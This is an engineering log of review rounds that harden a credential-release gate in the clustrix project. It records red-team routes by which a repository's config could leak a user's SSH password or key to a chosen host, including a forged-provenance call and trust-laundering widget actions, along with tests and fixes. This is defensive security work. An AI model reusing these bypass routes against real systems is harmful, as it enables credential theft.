Signature: `release_credential(target, *, provider="ssh", config=None,
sources=RELEASE_SOURCES) -> CredentialRelease`, where `sources` only ever
**narrows** — every branch applies the same checks.

**Wire-level proof, not diff-reading.** Route 6: the attacker's server logs `[]`
for a working-directory config and `("victim","password")` for
`~/.clustrix/config.yml`. Route 7: the negative test answers the storage prompt
**"y"**, so it measures the *refusal* rather than the absence of a prompt —
the difference between a real test and a comfortable one.

**8/8 scenario matrix**, both positive controls still releasing.
**Widget diff: 5 lines**, and `modern_notebook_widget.py` untouched — under the
8-line budget.

### Three things done right

**It found route 9 and did not paper over it.**
`auth_fallbacks.get_cluster_password` scans `CLUSTRIX_DEFAULT_PASSWORD` /
`CLUSTER_PASSWORD` — naming **no host** — and hands the result to whatever
hostname it was passed. Same shape as routes 2 and 6. Recorded in
`SECRET_SURFACES` and the enforcement allowlist as an open finding.

**It respected the route-8 boundary and answered it properly.** It did not fix
route 8 (another branch owns it), but **wrote the gate's input contract down**
in the module docstring and on `CredentialTarget.provenance`: the gate is
*given* provenance and cannot recompute one destroyed upstream. It fails closed
where it can — provenance required, no "unknown" member, a config with no
record reads `working-directory`. Two tests pin that.

That is the honest response to *"a choke point is only as good as its input"*:
encode the dependency rather than assume it.

**Its enforcement test states its own limit** — it proves a route cannot be
added *silently*, not that none exists; no static check follows `getattr` with a
built name, `importlib`, `eval`, plugins or notebooks. The runtime caller-module
guard is what makes a bypass fail.

### Two dead-code defects found while converting call sites

- `clustrix credentials test` passed lower-case field names to a helper indexing
  `SSH_HOST`, so it **always reported valid SSH credentials as invalid**.
- `scripts/aws/` asked for provider `"aws"`, which has never existed, so it
  could never authenticate. Now uses boto3's own chain.

### Four deviations, each justified in a docstring

`FlexibleCredentialAuthMethod` keeps an *applicability* filter after the gate
(it can only refuse, never release; unifying it broke 3 existing assertions);
`config.password`/`key_file` are not gate branches (not stored credentials);
AST rule 3 is an allowlist, since three legitimate non-file
`ClusterConfig(**…)` splats exist; `detect_config_files` is unchanged because
round 11 already passes a source at both call sites.

Gates: **1949 passed / 17 skipped / 0 failed**; black, flake8, mypy (35 files)
clean. Every stage has a recorded RED transcript.

## #123 closing round — `771c54d`. Both gaps killed by mutation.

**M-C killed, and the pin is directional.** Two tests drive the real
`_on_test_config` on a real `EnhancedClusterConfigWidget` (real ipywidgets, no
mocks). Deleting the caller's `if reachable is None:` branch fails
`test_the_widget_does_not_tell_the_user_a_host_is_down_on_no_evidence` with the
headline defect verbatim — while the negative control against `127.0.0.1:1`
**passes under the same mutant**.

That distinction matters: the test separates *"could not tell"* from *"not
reachable"* rather than asserting that some message changed. A blanket
assertion would read identically in a report and catch nothing.

**M-H killed, both handlers, with a precise construction:** `range(n + 1)` where
`n` is an `int` **subclass** whose `__add__` raises. `isinstance(value, int)`
accepts it, so it reaches the evaluator, and only the narrowed tuple catches the
failure. Widening `visit_Call` **or** `_evaluate_binop` to `except Exception`
gives `DID NOT RAISE`. The pre-existing `TypeError` test passes under both
mutants — confirming precisely where the gap was.

**The detaching handle is documented** in `get_config`'s docstring, verified
empirically first: stale `33` vs live `77`, `handle is get_config()` → `False`.
`load_config` rebinds the singleton while `configure` mutates in place, which is
exactly what makes it easy to miss.

### The blind-spot record is now honest about its own history

12 → **20**, across 8 root causes. The 8 dead-code bypasses are added as root
cause **H** — the pruner folds only `if <constant>` / `while <constant>` — each
verified missed and asserted missed. The module docstring now reads:

> five successive AST guards … 12, 30, 14-and-16, 22 and 8 ways

Recording *how many times this class of guard has been defeated here* is the
most useful thing a labelled lint can carry. It stops the next person
re-attempting the same approach in good faith.

Gates: `1869 collected / 1842 selected / 1825 passed / 17 skipped / 0 failed`
(+11 = 3 tests + 8 params). Two files touched;
`test_known_hosts_atomicity.py` untouched, as instructed.

## #164 closing round — `3956d1f`. Both items closed.

**E1 dies, and the evidence is directional.** Under the mutant, **only the
`gpu × clustrix-built` cells fail** (2 failed, 23 passed) — the `no-gpu` cells
still pass. That is the proof the GPU arm was the uncovered cell, not merely
that something broke. `_account` now carries an `nvidia-smi` answering the exact
CSV query `detect_gpu_capabilities` runs, and non-vacuity is asserted in-test:
detection must match what the account holds, and `gpu_packages_installed` must
have reached `venv_info`.

(A named env overrides `conda_env2_name` before generation, so the `user-named`
cells genuinely cannot see this mutant — worth knowing rather than treating
their passing as a gap.)

**E9 narrowed, not merely documented** — the harder of the two options. The
invariant assertion no longer scans *from* the `# Step 2` comment: a new
`_shell_level` helper separates shell lines from lines inside a `-c "` program,
the comment now only names *which* launch line is VENV2's, and the preamble runs
from the end of the previous stage's program. A new test splices VENV1's
activation one line **above** the comment into a real submitted script and
requires the assertion to fire; reverted → `Failed: DID NOT RAISE`.

That turns "we know about this blind spot" into "this blind spot is gone".

**E2/E3** documented in one sentence: only `conda_env2_name` kills;
`venv2_python` is read nowhere in `clustrix/` and `venv2_path` only feeds a log
line.

Test-file-only change; `clustrix/` untouched.

| Interpreter | collected | selected | passed | skipped | failed |
|-|-|-|-|-|-|
| 3.12.10 | 1990 | 1963 | 1943 | 20 | 0 |
| 3.11.16 | 1990 | 1963 | 1946 | 17 | 0 |

Baseline 1985/1958 + 5 new cases (4 GPU cells + 1 E9 test) = 1990/1963, +5 on
both — the arithmetic checks out, which is the cheapest guard against a
silently-skipped test.

Sphinx `-W --keep-going`: 0 warnings. Hygiene verified: `known_hosts` 32 lines /
0 loopback / mode 600, no `clustrix_venv*` in any real conda installation, 0
`__pycache__` left behind.

## Gate red-team — ROUTE 10, three ways. The gate does not hold.

**G1, the architectural one: `CredentialTarget` accepts a forged provenance.**

```python
release_credential(CredentialTarget(hostname=<anything>, provenance="runtime", …))
```

releases **even when the honest, untrusted `config=` is also passed**, because
`_stored_ssh_is_for_target` returns on `target.provenance` before consulting the
config.

If a caller can assert its own provenance, **the gate asks a question whose
answer the caller supplies.** That is decorative, not protective. Provenance
must be **derived, not declared**.

**G2 — lock 1 ("nothing else public") is simply false.** Three public paths
reach the store:

| path | note |
|-|-|
| `credential_manager.load_credentials_optional("ssh")` | public fn **and** method, **zero callers in the tree** |
| `credential_release._stored_credential("ssh")` | importable; **frame 2 *is* the gate**, so lock 3 passes *by construction* |
| `mgr.sources[i].get_credentials("ssh")` | source objects reachable via a public attribute |

`ensure_credential` was privatised; **its sibling thirty lines above was not**,
and `SECRET_SURFACES` does not name it. A frame check that passes by
construction for anything inside the gate's own module is a coincidence, not a
lock.

**G3 — deviation 2 rests on a false premise.** `config.password` / `key_file`
are checked **before** the gate in `setup_ssh_connection`, so a cloned repo
naming `key_file` in a working-directory `clustrix.yml` **bypasses the gate
entirely** and offers the victim's key to a host the repo chose.

**What failed to break it** (and it is a long list): direct call, computed
`getattr`, `importlib`, subclass, `eval`, `exec`, `functools.partial`, a
pre-captured bound method, a worker thread, `map()`, a generator, a metaclass
`__call__`, a property getter — all `RuntimeError`. 14 of 15 mutants die. **Both
positive controls still release, verified on the wire**, 8/8 matrix.

Route 9 confirmed live but judged an **unconverted call site, not an
architectural hole** — it fits the gate's shape. Note lock 3 could never have
caught it: it reads `os.environ` directly and never touches the store.

## #167 round eight — `40af31a`. Routes 9a and 9b closed.

**The reasoning on 9a is the sharpest of the campaign.** It rejected a version
key:

> absence of a version key is exactly as forgeable as absence of the source, so
> it would only restate what absence says in a second mechanism that can
> disagree; re-deriving from location **is** the defect.

So absence now **fails closed to a source of its own** — `unrecorded-provenance`.

| | before | after |
|-|-|-|
| source | `user-config-dir` | `unrecorded-provenance` |
| trusted | True | **False** |
| after Apply (`configure(**asdict)`) | `runtime`, released | refused |
| `server.authentications` | `[("victim","password")]` | `[]` |

**And it answered the acceptance test in user terms, measured:** everything
loads, nothing deleted; one warning naming only host-bearing profiles; a refusal
**only** if the user uses one whose stored credential names no host; recovery via
`clustrix.adopt_profile_store()` + a new process. Crucially it **only lifts
doubt** — an entry already recording `working-directory` stays refused.

**9b**: all three sidecars now move with a rename, `_on_delete_config` forgets
all three, and a genuine pre-existing bug surfaced — **`DEFAULT_CONFIGS.copy()`
was shallow**, so renaming a built-in mutated the module template for every
later widget. Found only because two of the agent's own tests interfered.

Gates: `1976 collected / 1949 selected / 1932 passed / 17 skipped / 0 failed`.

## #167 round-eight review — ROUTE 11, the "+" button

`_on_add_config` (`notebook_magic_widget.py:812`) copies the **live fields** —
still the repository's `cluster_host` — into a new name and moves
`current_config_name`, **without moving the three name-keyed sidecars**.
`_discovered_source_for` → `None`, Apply stamps `runtime`, trusted.

```
before "+" : working-directory
after  "+" : None / runtime
server.authentications == [('victim','password')]
```

**Same defect class as 9b, different door: renaming was fixed, copying was
not.** Two doors of one family have now leaked, so round nine is auditing
*every* name-mutating handler — add, rename, delete, clone, import, load —
rather than patching a third door and hoping.

The reviewer verified the fix itself before reporting (compute
`_discovered_source_for` **before** `current_config_name` moves; carry both maps
onto the new name): both probes green, 129 passing across the four
widget/provenance files. Applied, verified, reverted.

### What held — including the two most likely to be wrong

- **`unrecorded-provenance` grants nothing.** Inert in a working-dir or
  redirected store. Written *over* a recorded `working-directory` in
  `~/.clustrix` it does become adoptable — but that needs write access to the
  user's own store, and **deleting the key does the same**, so the value confers
  no capability. Round-tripped ×3 across real processes it stays
  `unrecorded-provenance`.
- **`adopt_profile_store()` lifts only doubt**: a recorded `working-directory`
  gives `adopted=[]`, file unchanged, still refused in a fresh process. Unknown
  strings are not adoptable. Both remedies work on the wire.
- Route 9a independently re-proven with a `git archive 7f82333` **writer**:
  reader `f3a27f2` leaked; reader HEAD refused, server saw nothing.
- No shallow-copy siblings; `clone_profile` / `rename_profile` do not launder.
- 13 of 14 mutants die. M8 survives and is cosmetic — the warning names hostless
  profiles too, contradicting the round-eight claim that it names only
  host-bearing ones. Fix or correct the claim; do not leave the record wrong.

### Hygiene verified by me

The reviewer's probe appended one line to the real `~/.ssh/known_hosts` and it
removed it. Confirmed rather than trusted: **32 lines, 0 loopback, mode 600**,
with `ndoli`, `discovery`, `tensor01`, `tensor02` and `github.com` all intact.
That is the fourth such incident today, every one self-reported and cleaned —
and every one caused by a standalone probe run outside pytest's `isolate_home`
fixture.

## #123 final review — "not quite done", and the best finding is recursive

**R1 — the narrowing is nullified downstream, by this issue's own defect.**
`SafeRangeEvaluator`'s handlers were narrowed so a genuine bug propagates
instead of being laundered into `"unknown"`. Correct in isolation. But through
the **real entry point**, `_analyze_for_loop`'s
`except Exception → logger.debug; return None` **re-swallows it**, turning the
raise into `find_parallelizable_loops(...) == []`.

So the narrowing is **invisible to every caller**, and the test's claim that
*"the only honest outcome is for it to propagate"* is true of
`SafeRangeEvaluator` and **not of clustrix**.

A narrowed handler nested inside a broad one is exactly as silent as the broad
one alone. Same lesson as M-C one layer up: **the function was pinned, the call
site was not.**

**R2 — E7 survived.** Making `load_config` mutate in place instead of rebinding
passes the full suite, so the detaching-handle behaviour documented last round
is **prose only**. Pin it or delete the paragraph — an undocumented-but-tested
behaviour beats a documented-but-untested one.

**R3 — bypass 31: seven shapes, none modelled, and one reaches CI.**
`except builtins.Exception:`, a tuple constant, tuple-unpacked aliases, an
aliased `suppress`, `suppress(*_ERRORS)` — and **`except* Exception: pass`**,
invisible because `ast.TryStar` is not `ast.Try`. **Both 3.11 and 3.12 are in
`tests.yml`**, so that one is reachable today. Catch the cheap ones, record the
rest — not a sixth attempt at completeness.

The prose also contradicts its own count: line 785 says "the 12 entries", line
762 says "four AST guards"; the real values are **20** and **five**. `len == 20`
is asserted, so only the sentences are stale — which is precisely the pattern
this campaign keeps finding.

**R4 — E6 survived**: dropping `OverflowError` from the narrowed tuple. Pin the
membership.

### What the review confirmed, and these were the ones most likely to be false

- **The M-C pin is genuinely directional**: under the mutant the negative
  control **and** both `_test_remote_connectivity` unit tests pass; only the
  headline test fails.
- **The printed-output tests are load-bearing, not vacuous.**
  `Output.__enter__` is a no-op without a kernel, so `capsys` reads the real
  stream — and sending the same text to **stderr kills the test**. Rewording
  `Cannot reach` kills the *negative control*, so that assertion cannot rot
  silently.
- All seven call-site fixes re-killed. Torn write: full revert killed. Fork:
  M3 → 5/5 `DEADLOCK`, M4 → 5/5 `HOST None`. M6 dead.
- `D2a` survives **by design** (documented belt-and-braces); `E8` dies.

## #164 — DONE. Evidence posted, real-hardware checkbox left open.

Final review: **18 mutants, 3 survivors, all proven benign** —
`GPUSHAPE` (a pre-existing gap in `detect_gpu_capabilities`, now **#172**) and
two mutations of a test helper that only make it scan *more* lines.

**Guard 4 bit for real**, which validates adding it: from the default cwd
`/Users/jmanning/clustrix`, `sys.path[0]` beat `PYTHONPATH` and imported the
wrong tree. The runner now `cd`s first.

Two latent findings recorded, neither live:

- `_shell_level` is confused by an **indented** comment ending in `-c "` — the
  regex only excludes `#` at column 0. No generated script or golden emits one.
- The shipped version guard closes with `" || exit 1`, which `_shell_level` does
  not treat as a close, so on all 10 named goldens it misparses and swallows
  stage 1's launch. The resulting window is **wider**, not narrower — the
  conservative direction.

Gates on both interpreters: 3.12.10 → 1943 / 20 / 0; 3.11.16 → 1946 / 17 / 0.
Sphinx `-W`: 0 warnings. 19 goldens byte-identical. Host independence verified
under `env -i`, a mode-0500 `HOME`, a scrubbed `PATH` and no conda on PATH.

## Filed: #172

`detect_gpu_capabilities` sets `gpu_available` **before** parsing `nvidia-smi`,
so output it cannot read still reports a GPU as available — and nothing
downstream branches on the parse result. Same family as #159's *"could not tell
returned as a confident answer"*, except here the confident answer selects a GPU
code path on output that was never understood.

Pre-existing; #164's GPU work branches only on `gpu_available`, which is exactly
why the mutant was invisible to its tests.

## #167 round nine — `9d0e568`. Route 11 closed, and the family audited.

Route 11 closed on the wire, with a **control arm** proving the pin is
directional:

| arm | after "+" | authentications |
|-|-|-|
| before, no "+" | `working-directory` | `[]` |
| before, pressed "+" | `None` → `runtime` **trusted** | **`[('victim','password')]`** |
| after, no "+" | `working-directory` | `[]` |
| after, pressed "+" | `working-directory` untrusted | **`[]`** |

**The audit is the real result** — ten name-mutating doors, each driven for
real, no orphaned sidecar from any, **no third leak**. Locked by a 7-way
parametrised invariant test.

### Two verdicts more interesting than the fix

**A retention that is load-bearing.** Pasting *over* a found name **keeps** the
sidecars and fails closed — because clearing them would launder a README's paste
into a trusted config. The safe-looking action (forget what you knew) is the
dangerous one here.

**A correction on M8.** The round-eight *claim* was right: the warning does name
only host-bearing profiles. The mutant survived because **nothing asserted it**.
Worth stating as a rule: **a surviving mutant means "untested", not "wrong"** —
conflating the two sends you to fix code that was already correct. Now pinned;
14 of 14 die.

Gates: `1989 collected / 1962 selected / 1945 passed / 17 skipped / 0 failed`.

### Round nine's review is asked to audit the audit

Because "the family is closed" is a much stronger claim than "three doors are
fixed", the review must verify each of the ten verdicts independently and hunt
for a door the audit did not enumerate — including indirect ones: a dropdown
observer, a traitlets callback, an import, an undo, a modern-widget profile
applied into the legacy widget.

It must also challenge **both** deliberate decisions in both directions:
excluding `config_file_map` from the carry, and retaining sidecars on
paste-over. A retention that fails closed can also **wrongly condemn** something
the user genuinely typed.

## #123 closing round — `ec0194b`. All three items closed.

**R1 — and it was two handlers, not one.** `find_parallelizable_loops` with an
`int` subclass whose `__add__` raises: **before `[]`, after `EvaluatorBug`**.
Both `_analyze_for_loop`'s `except Exception → return None` **and**
`detect_loops_in_function`'s `except Exception → return []` were laundering it.

**An AST scan found 13 narrowed-inside-catch-all sites** in `clustrix/`. One
came from this issue's own work (fixed by un-nesting); **the other 12 predate
it** and are now recorded on **#168** as a defect class rather than twelve
separate bugs.

**R2 — E7 pinned, not deleted**, and the test kills **both** mutants:
`load_config` mutating in place, and `configure` rebinding.

**R3 — six of seven shapes caught**, each RED-verified: dotted
`builtins.Exception`, a tuple constant, tuple-unpacked aliases, aliased
`suppress`, `suppress(*_ERRORS)`, `contextlib.suppress(builtins.Exception)`.

**And it said what it could not verify.** `except*` is a parse error on 3.10 and
no 3.11+ interpreter existed in that worktree, so the `BYPASSES` entry is added
only when `ast.TryStar` exists (collecting on CI's 3.11/3.12), with a separate
test pinning the wiring everywhere:

> I could not run its RED transcript; stating that rather than implying
> otherwise.

A 3.11 **is** available elsewhere in this campaign, so the final review's first
job is exactly that case.

**A ninth blind-spot family recorded** — an alias bound by a *call*
(`_ERRORS = tuple([Exception])`), i.e. constant propagation through arbitrary
expressions. `KNOWN_BLIND_SPOTS` 20 → 21, prose and constant moved **together**.
Stale prose fixed: "four AST guards" → five, "12 entries" → 21.

**R4 — E6 dies in both tuples**, and the test asserts **which handler answered**
by its log line, because `_evaluate_binop`'s membership was masked by
`visit_Call`'s. `visit_Call`'s is pinned via `range(-n)`, whose negation is
outside `_evaluate_binop`.

Pinning *"the right code path handled it"* rather than *"an exception was
caught"* is the difference between constraining behaviour and constraining
outcomes.

Also fixed en route: a pre-existing E201/E202 that **pre-commit's** flake8 flags
but the looser local one does not — worth knowing, since a local pass is not the
CI gate.

Gates: `1887 collected / 1860 selected / 1843 passed / 17 skipped / 0 failed`
(+18 on baseline). `pre-commit run flake8 --all-files` passes.

## #167 round-nine review — ROUTE 12, and the audit was *correct*

The reviewer independently re-verified all ten in-memory doors and found **no
eleventh**: every `self.configs[...]` write and `current_config_name` assignment
lives in one file, nothing outside touches `.configs`, modern↔legacy are
disjoint. The audit was right.

**And the leak was somewhere else entirely.** `_on_save_config` writes the found
configuration to `get_config_dir()/<name>.yml`, and `detect_config_files()`
infers trust from that directory:

| session | source map | server |
|-|-|-|
| S1 select found `./config.yml` | `working-directory` | — |
| S1 press **Save** | writes `~/.clustrix/config.yml` | — |
| S2 fresh widget | **`user-config-dir`** | — |
| S2 Apply + connect | `user-config-dir` | **`[('victim','password')]`** |

The precondition is attacker-controlled through `name:` in the shipped file —
`""` and `Config` both land on `config.yml`, giving a **trusted twin** beside
the still-untrusted original.

### The lesson: an in-memory invariant cannot see a filesystem channel

After Save, **every sidecar key is still valid**. The invariant holds; the
laundering happens on disk, one restart later. However complete an in-memory
audit is, it is complete *within its medium*.

That is the same shape as route 8 (provenance lost across a process boundary)
and route 9a (lost across an upgrade). Three of the twelve routes cross a
boundary the in-process reasoning does not model — which is a stronger argument
for the gate's "state what you rely on about your input" discipline than for any
further auditing.

### Two secondary results

- **The `config_file_map` exclusion is right for the wrong reason.** Its stated
  justification — that save routing "decides which entries a save writes back,
  not who may receive a credential" — is **exactly what route 12 falsifies**.
  Correct conclusion, false premise. Seventh instance of that pattern today.
- **"Fails closed" was overstated.** Paste-over retention blocks only a
  **verbatim** re-paste; change the host by one character and it is `runtime`,
  trusted. Not a leak — it matches the declared paste-is-runtime policy — but
  the row must say what it actually guarantees.

Three survivors, all defensive-only today (M1 carry-never-clears, M13
`config_file_map` carry, M16 multi-config paste). Being pinned anyway:
"defensive-only today" is how routes 11 and 12 both started.

## Credential gate, round two — all six findings closed

Five staged commits: `9ec9b6b` G1 · `a197847` G2 · `3c28311` G3/G5 ·
`56b0a70` G4 · `238167a` G6.

**G1 — it removed the ability to lie, rather than validating the lie.**
`CredentialTarget(provenance=…)` now raises `TypeError`; the field is **gone**.
`derived_provenance(config, hostname)` computes it inside the gate from records
no caller writes — `config.source_that_named_hostname` outranks
`get_config_source`, and `None` (nothing accompanied the request) is not in
`TRUSTED_CONFIG_SOURCES`.

**Removing the parameter found a bug that validating it never would have:**
deriving provenance about the *target's* host closed a hole the field had hidden
— a trusted config plus an override naming a tainted host used to release.

**G2 — the guard is per-function, not per-module**, on the right insight:
*a module check passes by construction for anything inside the file.* That is
the difference between a lock and a coincidence.
`load_credentials_optional` was **deleted** rather than gated — an unused way to
get a secret without naming a recipient is a door with no lock.

**G3 — and the same hole existed in a second path.**
`ClusterFilesystem._get_ssh_client` read `key_file` before the gate too. The
corrected docstring says why the original premise was false: `save_to_file`
omitting the fields is about *writing*; `key_file` is an ordinary declared
field; the automatic search reads `./clustrix.yml`.

**G6 — enforcement rule 1 was dead**, checking for an import that now raises
`ImportError`. Rewritten with a **fire-ability test**, which is the right
response to finding a check that could not fire. Rule 2 is now per-symbol and
matches any *reference* — alias-then-call, `getattr` literal.

**G4** — route 9 converted; an existing test that asserted the old behaviour was
**rewritten in both directions** and said so in the commit.

Verification: **8/8 wire matrix**, all four positive controls still releasing
with the sentinel, **10/10 mutants dead**, `2026 collected / 1999 selected /
1982 passed / 17 skipped / 0 failed` (+33 tests).

## #123 final review — VERDICT: done. Plus a test that lies by its own name.

**The unverified claim now holds.** `except*` on CPython 3.11.16: 40 params vs
39 on 3.10, the entry present, GREEN 41 passed, and RED with the pre-fix
`TRY_NODES=(ast.Try,)` → `2 failed, 39 passed`. Carried honestly as unverified
for a round rather than implied, and now it is not.

**R1 holds at the entry point** — `find_parallelizable_loops`,
`detect_loops_in_function` and `analyze_loop_patterns` all raise `EvaluatorBug`;
the control still folds. An independent, **stricter** AST scan finds **8**
narrowed-inside-catch-all sites, **none** in `loop_analysis.py` or `config.py` —
un-nesting complete — with three spot-checked blames confirming the rest predate
this work by six weeks (2025-07-01/02/13).

### Three items left, and the third is the instructive one

- **M2 survived** — widening `_analyze_while_loop`. R1 fixed
  `_analyze_for_loop` and **missed its twin**. Same pattern as route 11 after
  9b, and the `ClusterFilesystem` twin of the `setup_ssh_connection` hole.
- **M3 survived** — widening the source-acquisition tuple.
- **Bypass 32**: `ast.AnnAssign` (`_E: type = Exception`) and
  `except (_E := Exception):` are missed; `_catch_all_aliases` walks only
  `ast.Assign`/`ast.ImportFrom`. Recorded, not chased.

### `test_the_blind_spot_list_matches_the_prose` never reads the prose

That is how three text errors survived, **two of them created by the very
commit that fixed the previous three**:

| claim | reality |
|-|-|
| family I: the resolver handles "every one that is a literal" | false — an `AnnAssign` binding *is* a literal |
| line 895: "the **20** entries in KNOWN_BLIND_SPOTS" | the constant is **21**; the diff moved 12→20 while setting 20→21 |
| line 1037: "the **four** previous guards" | the same commit corrected line 870 to **five** |

**A test named for checking prose that does not read prose is worse than no
test — it is a false assurance.** And it is this issue's own defect class,
sitting in this issue's own test file: something reports success without having
checked.

Either it reads the numbers in the text, or it gets renamed to what it does.

**R4 is non-vacuous but brittle** — rewording the message alone goes RED, and
`record.funcName == '_evaluate_binop'` is available, which is identity rather
than prose. **R2's halves fail independently**, on different assertions.

16 of 18 mutants die, including the torn write, both fork mutants,
`exists()→False`, unlocked `configure` and the published-flag drop.

## F1 (unlocked `configure()`) — verified fixed and armed, by me, 2026-08-20

The #123 red-team's standing verdict against `5970455` named four defects. It
honestly flagged that the worktree moved underneath it mid-run
(`5970455` -> `ec0194b`, three commits), so that verdict is **against a stale
base** and is not a judgement on the current tip. The four findings map
one-to-one onto the three commits that landed:

| Finding vs `5970455` | Commit |
|-|-|
| F1 unlocked `configure()` race | `ec0194b` |
| F5 guard defeated 22/24 ways | `5db9631` ("the guard was a lint") |
| F2 fix unarmed by its test (M3/M4 survive) | `771c54d` |
| 7 of 9 swallows annotated, not fixed | `5db9631` |

**F1 checked directly rather than taken on trust.** At `ec0194b` the lock now
wraps the whole apply loop, and the loop binds `target = _config` once instead
of re-reading the module global per iteration — so the loop no longer depends
on `_config` not being rebound mid-loop, which is the property the lock exists
to provide rather than one to lean on twice.

**The test is armed.** `test_a_configure_is_not_torn_in_half_by_a_concurrent_load`
(`tests/unit/test_import_has_no_side_effects.py:735`). I extracted `ec0194b`
to a throwaway tree, reverted `configure()` to the unlocked form, and ran it
under `/private/tmp/rt4venv/bin/python` (3.11.16):

- **RED** against the defective code, deterministically, with exactly the
  documented symptom: `cluster_host` reverted to the file's value while the
  other five keywords applied. `assert {False, True} in ({True}, {False})`.
- **GREEN** against unreverted `ec0194b` in 2.04s — the 2s being the
  `loaded.wait(timeout=2)` that the docstring predicts once the loop is locked.

It also carries the anti-vacuity guard the four earlier instances of this
pattern lacked: `assert len(arrivals) == len(_CONFIGURE_KEYWORDS)`, "the
preemption was never scheduled inside the apply loop, so this test proved
nothing". The interleaving is *scheduled* with a trace function, not waited
for — 200 unforced trials at a 1ns switch interval produced 0 torn results,
which is why the suite could not see the defect.

**Toolchain note for future rounds:** the 3.10+ interpreter with project deps
is `/private/tmp/rt4venv/bin/python` (3.11.16). System `python3` is anaconda
base 3.9.13 — below the project floor, though it does have the deps, which
makes it a trap: it imports fine and runs a subset.
